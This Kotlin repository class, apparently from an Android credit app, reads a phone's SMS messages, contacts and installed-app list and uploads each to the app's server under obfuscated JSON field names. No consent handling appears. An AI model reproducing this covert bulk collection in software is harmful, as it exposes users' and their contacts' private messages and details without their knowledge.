package com.colombia.credit.module.upload

import com.bigdata.lib.ContactsHelper
import com.bigdata.lib.DevicesAppHelper
import com.bigdata.lib.MCLCManager
import com.bigdata.lib.SmsHelper
import com.colombia.credit.app.BaseRepository
import com.colombia.credit.app.getAppContext
import com.colombia.credit.bean.resp.RspCheckData
import com.colombia.credit.bean.resp.RspResult
import com.colombia.credit.net.DataApiService
import com.common.lib.net.ApiServiceLiveDataProxy
import com.common.lib.net.ResponseCode
import com.common.lib.net.bean.BaseResponse
import com.google.gson.JsonObject
import com.util.lib.GsonUtil
import io.reactivex.Flowable
import javax.inject.Inject

class UploadRepository @Inject constructor(private val dataApiService: DataApiService) :
    BaseRepository() {

    fun uploadInfo() =
        ApiServiceLiveDataProxy.request(Boolean::class.java) {
            Flowable.fromPublisher {
                val result = MCLCManager.synUpload()
                var code = ResponseCode.SUCCESS_CODE
                if (!result.isSuccess()) {
                    code = ResponseCode.OTHER_ERROR_CODE
                }
                try {
                    it.onNext(BaseResponse(code, result.isSuccess(), result.exception?.message, result.exception))
                } catch (e: Exception) {
                    it?.onError(e)
                }
            }
        }

    fun getInfo() = ApiServiceLiveDataProxy.request(RspCheckData::class.java) {
        dataApiService.checkData()
    }

    fun uploadsms() = ApiServiceLiveDataProxy.request(RspResult::class.java) {
        val sms = SmsHelper.getMessage(getAppContext())
        val jobj = JsonObject()
        jobj.addProperty("MGTnhn", GsonUtil.toJson(sms).orEmpty())
        dataApiService.uploadSms(createRequestBody(jobj.toString()))
    }

    fun uploadApp() = ApiServiceLiveDataProxy.request(RspResult::class.java) {
        val list = DevicesAppHelper.getAppListInfo(getAppContext())
        val jobj = JsonObject()
        jobj.addProperty("bPp7hQmh", GsonUtil.toJson(list))
        dataApiService.uploadAppList(createRequestBody(jobj.toString()))
    }

    fun uploadCo() = ApiServiceLiveDataProxy.request(RspResult::class.java) {
        val cons = ContactsHelper.getContacts(getAppContext())
        val jobj = JsonObject()
        jobj.addProperty("P7r2", GsonUtil.toJson(cons))
        dataApiService.uploadCo(createRequestBody(GsonUtil.toJson(jobj).orEmpty()))
    }
}